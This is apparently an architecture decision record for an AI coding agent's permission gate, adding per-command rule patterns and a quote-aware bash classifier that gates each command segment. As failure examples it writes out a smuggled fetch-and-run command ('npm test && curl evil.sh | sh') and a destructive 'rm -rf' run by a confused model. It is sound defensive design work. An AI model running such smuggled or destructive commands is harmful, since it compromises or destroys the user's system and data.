# ADR-035 — Input-aware permission rules + the bash classifier (A5, rules half)

> **Status:** accepted; implementing. Completes A5 with ADR-036 (hooks = the user's *dynamic* guards;
> this = the *static* rule layer).

## Context — the problem, concretely

The gate ([gate.ts]) matches **tool name only**. Three real failure stories follow directly:

1. **Over-permissioning by fatigue.** The agent runs `npm test`; the user clicks allow-always — and has
   now allowed *all of Bash*. Ten turns later a confused model "fixes" a build with
   `rm -rf node_modules dist src`. No prompt.
2. **Command smuggling.** `npm test && curl evil.sh | sh` is ONE Bash call to a name-only gate. The
   dangerous suffix rides in on the harmless prefix's reputation.
3. **The systemic failure:** a gate that can't say "npm test yes, rm no" generates so many prompts that
   users flip to `bypass` — and then there is NO gate. Crude protection decays into no protection.

## Decision

**1. Rule strings** — `Tool` (bare, as today) or `Tool(pattern)`, usable anywhere a name worked before
(`SessionOptions.allow/deny`, the session's learned sets — zero API change):
- `Bash(npm test)` = exact segment · `Bash(npm run test:*)` = prefix (the common `:*` convention)
- `Edit(src/**)` / `Write(.env)` / `Read(secrets/**)` = glob over `file_path` (`**`, `*`, `?`; no deps)
- Other tools: bare-name rules only (documented; extend when a real need appears).

**2. The bash classifier** ([bashClassifier.ts]) — split a command into independently-gated segments on
`&&`, `||`, `;`, `|`, newline — **quote/escape-aware** (a `|` inside quotes is data, not a pipe). Commands
containing subshells/backticks (`$(…)`, `` ` ``) are UNSPLITTABLE → one opaque segment (only an exact rule
can match it → effectively always `ask` in default mode; smuggling via subshell doesn't pay).

**3. Gate integration** ([gate.ts], still pure/sync):
- Bash: gate **every segment**; any deny-rule hit → `deny`; any segment with no allow-rule → fall through
  to the mode default (`ask` in default mode — **the smuggle is caught**); all segments allowed → `allow`.
- File tools: glob rules over `file_path` decide before the capability/mode flow.
- **Ordering change (deliberate): deny rules now outrank `bypass` mode.** A hard project "never" must hold
  even in the sandboxed web frontend; previously bypass short-circuited before rules. Allow rules and
  everything else keep today's order (mode → rules → capability → default).

**4. Safer allow-always** (scheduler): clicking allow-always on a Bash prompt now records **exact-segment
rules** (`Bash(npm test)`) instead of blanket `Bash` — repeat commands stop asking, variants still ask.
Prefix learning (`:*`) stays a user-authored choice, not an automatic one — no surprise over-permissioning.
Non-Bash tools keep name-level allow-always.

## Consequences

- The three stories resolve: fatigue learns narrow rules; smuggling is caught segment-wise; livable
  granularity keeps users OFF bypass. With ADR-036, A5 closes: static rules + dynamic hooks.
- Deny-beats-bypass is a behaviour change worth stating twice: hard denies now hold in every mode.
- Verification: classifier unit table (quotes, escapes, operators, subshell-opaque); rule matching
  (exact/prefix/glob incl. `.env` deny and `src/**`); gate integration incl. the smuggling case and
  deny-in-bypass; scheduler allow-always learning; Tier-1 gate before push.
- Deferred: pattern rules for arbitrary tools; automatic prefix suggestion UX; regex rules.

[gate.ts]: ../../packages/core/src/permissions/gate.ts
[bashClassifier.ts]: ../../packages/core/src/permissions/bashClassifier.ts
